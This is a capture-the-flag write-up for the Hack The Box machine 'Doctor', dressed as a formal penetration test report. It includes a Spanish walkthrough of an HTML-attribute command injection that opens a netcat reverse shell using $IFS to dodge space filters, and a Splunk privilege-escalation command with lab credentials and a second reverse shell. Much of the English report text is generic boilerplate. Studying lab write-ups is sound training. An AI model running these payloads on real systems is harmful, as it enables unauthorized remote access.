---
title: "OffSec Assessment: Doctor (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Doctor (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_01.png"
---

# Offensive Security Assessment Report: Doctor

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Doctor** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Public-Facing Network Service Exploitation
* **Privilege Escalation Vector:** Local Privilege Escalation
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Doctor |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Easy |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Public-Facing Network Service Exploitation |
| **Privilege Escalation Vector** | Local Privilege Escalation |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Public-Facing Network Service Exploitation
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Local Privilege Escalation
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

Reconocimiento:


![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.



![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.


> 
> 
> 
> # Comprobación de RCE y obtención de shell (resumen ordenado)
> 
> ## 1) Contexto y prueba inicial
> 
> - **Listener**: tienes un listener activo en tu equipo (10.10.14.8:4343).
> - **Prueba de RCE**: al enviar `id`, la respuesta fue el usuario **`web`**. Esto confirma **ejecución remota de comandos** (RCE) en el objetivo bajo ese usuario.
> 
> ## 2) Payload usado para intentar la shell
> 
> El payload que enviaste (embebido en un atributo HTML) fue:
> 
> ```html
> html
> CopiarEditar
> <test src="http://10.10.14.8:4343/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.8'$IFS'4343')">
> 
> ```
> 
> > El tag <test> es irrelevante como elemento HTML real; lo importante es que el valor del atributo acaba siendo evaluado por un shell en el servidor (por cómo la app procesa la entrada), y por eso se ejecuta lo que hay dentro de $(...).
> > 
> 
> ### Qué hace cada parte
> 
> - `$( ... )`: **sustitución de comando** de shell. Todo lo que haya dentro se **ejecuta** y su salida sustituye a la expresión.
> - `nc.traditional`: variante de **netcat** que **sí** soporta `e`.
> - `$IFS`: variable interna del shell (**Input Field Separator**). Por defecto equivale a un separador en blanco (espacio/tab/nueva línea).
>     - Uso aquí: **evitar escribir espacios literales** (que a veces rompen el payload o están filtrados).
>     - Ejemplo: `nc.traditional$IFS-e$IFS/bin/bash` → el shell lo interpreta como `nc.traditional -e /bin/bash`.
> - `e /bin/bash`: hace que netcat, al conectar, **ejecute** `/bin/bash` (reverse shell).
> - `'10.10.14.8' '4343'`: IP y puerto de tu listener, **entre comillas** para robustez (evita que la expansión rompa los argumentos).
> 
> En conjunto, el comando ejecutado dentro de `$(...)` es equivalente a:
> 
> ```
> bash
> CopiarEditar
> nc.traditional -e /bin/bash 10.10.14.8 4343
> 
> ```
> 
> y, si se ejecuta, abre una **conexión inversa** hacia tu listener, dándote una TTY interactiva como el usuario `web`.
> 
> ## 3) Por qué se usó `$IFS` y comillas
> 
> - **$IFS**: truco típico cuando **no puedes usar espacios** (por filtros, WAF, contextos de atributo, etc.). Al expandirse, el shell introduce el separador correcto y los argumentos quedan bien formados.
> - **Comillas**: añaden resiliencia en argumentos “delicados” (como la IP/puerto dentro de un contexto de parseo raro), reduciendo el riesgo de que algún carácter sea malinterpretado.
> 
> ## 4) Resultado observado
> 
> - Tu listener recibió actividad y el `id` devolvió `web`, lo que confirma RCE.
> - Al enviar el payload anterior, la intención era **elevar** de “RCE comprobado” a “shell interactiva” reutilizando netcat en el host víctima.
> 
> ## 5) Nota de estabilidad (lectura de tu intento)
> 
> - Comentaste que probaste con `nc.traditional` y que `nc` a secas “no hacía el trabajo”. Es coherente: no todas las variantes de netcat aceptan `e`; la de “traditional” sí.
> - El uso de `$IFS` y comillas fue para **sortear espacios** y **fortalecer** el payload en un contexto de inyección (atributo HTML → ejecución por shell en backend).
> 
> ---
> 
> ## TL;DR para tu write-up
> 
> 1. **Validé RCE**: `id` devolvió `web`.
> 2. **Intenté reverse shell** incrustando un comando en un atributo evaluado por shell:
>     
>     ```html
>     html
>     CopiarEditar
>     <test src="http://10.10.14.8:4343/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.8'$IFS'4343')">
>     
>     ```
>     
> 3. **Técnicas usadas**: `$(...)` para ejecución, `nc.traditional` por soporte de `e`, `$IFS` para sustituir espacios, comillas para robustez.
> 4. **Objetivo**: obtener TTY inversa en 10.10.14.8:4343 como `web`.


![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.


299f6f6d90009bf51079e7b67e403855


![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_05.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


```jsx
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.8 --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh 10.10.14.8 443'

```

4a2e934af476d8d736737c05cf856d28


![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_06.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Public-Facing Network Service Exploitation) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
